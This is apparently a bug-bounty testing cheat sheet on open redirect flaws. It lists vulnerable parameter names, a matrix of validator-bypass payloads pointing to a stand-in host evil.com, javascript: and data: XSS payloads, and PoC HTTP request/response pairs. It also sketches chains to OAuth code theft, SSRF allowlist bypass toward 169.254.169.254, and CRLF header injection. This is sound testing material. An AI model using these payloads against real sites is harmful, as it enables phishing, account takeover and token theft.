# Open Redirect

**What it is:** App redirects to a user-controlled URL without validation. Low severity alone; powerful as a chain link (OAuth token theft, SSRF filter bypass, phishing).

## Where to look
`redirect=`, `return=`, `returnUrl=`, `next=`, `url=`, `dest=`, `continue=`, `goto=`, `callback=`, `r=`, login/logout redirects, OAuth `redirect_uri`.

## Test steps
- [ ] `?next=https://evil.com` → 302 to evil?
- [ ] Bypass weak validators:
```
//evil.com                 https:/evil.com
https:evil.com             https://target.com@evil.com
https://target.com.evil.com   /%2f/evil.com
https://evil.com%23.target.com   ?x=.target.com  #.target.com
\/\/evil.com               https://evil。com  (unicode)
```
- [ ] Protocol: `javascript:alert(1)` in the redirect → XSS.
- [ ] CRLF in the redirect param → header injection.

## Impact
Phishing; **real value** when chained: steal OAuth `code`/`token`, bypass SSRF allowlist, session token in redirect.

## Tools
`openredirex`, Burp, param mining.

## 🎯 PoC — Request → Response

```http
GET /login?next=https://evil.com HTTP/2
Host: target.com
```
```http
HTTP/2 302 Found
Location: https://evil.com                ← unvalidated redirect
```
Validator-bypass variant (`@` userinfo trick past a naive "starts-with target.com" check):
```http
GET /login?next=https://target.com@evil.com HTTP/2
Host: target.com
```
```http
HTTP/2 302 Found
Location: https://target.com@evil.com     ← browser navigates to evil.com
```

## Extended bypass matrix
```
Scheme/slash:   //evil.com  /\evil.com  \/\/evil.com  https:/evil.com  https:\\evil.com  ///evil.com  /%2F%2Fevil.com
Userinfo:       https://target.com@evil.com  https://target.com%40evil.com  //target.com:pass@evil.com
Fragment/query: https://evil.com#@target.com  https://evil.com?.target.com  https://evil.com\@target.com
Fake subdomain: https://target.com.evil.com  https://evil.com/target.com  https://target%E3%80%82evil.com (unicode dot)
Encoding:       %2f%2fevil.com  double %252f  %09/%0d evil.com  whitespace/CRLF  https://evil%00.target.com
Data/JS:        data:text/html,<script>...  javascript:alert(1)  (→ XSS if reflected into href/location)
Allowlist echo: ?url=https://evil.com/target.com  ?next=/\/evil.com  ?redirect=https://target.com.evil.com
```

## Deep cuts — where redirects actually pay
- [ ] **OAuth/SSO `code`/`token` theft (top chain):** an open redirect on a **whitelisted `redirect_uri` host** turns "valid" OAuth into full ATO — the AS sends the `code` to the allowlisted host, which 302s it (with the `code` in query/`Referer`) to you (`04-auth-session/04`, "dirty dancing" via fragment).
- [ ] **SSRF allowlist bypass:** the server validates *your* URL then follows a 302 to `169.254.169.254`/internal (`03-injection/06`).
- [ ] **Reset/verification-token leak:** redirect after reset/login carries the token in the URL → leaks via `Referer` to your host.
- [ ] **DOM/client redirect sinks:** `location = new URLSearchParams(location.search).get('next')`, `location.hash` → `location.href`, meta-refresh from a param — these are DOM open-redirects (and often DOM-XSS with `javascript:`).
- [ ] **CRLF in the redirect param → header injection/response splitting** (`03-injection/07`) → `Set-Cookie`, cache poisoning.
- [ ] **Filter-in-the-value trick:** validators that just check "contains target.com" — put it in the path/query/userinfo while the host is yours.

## Report notes
Show the 302 to your domain. Prefer demonstrating a chain (OAuth code exfil, SSRF-allowlist bypass, token leak) for meaningful severity — standalone redirect is often low/informational.
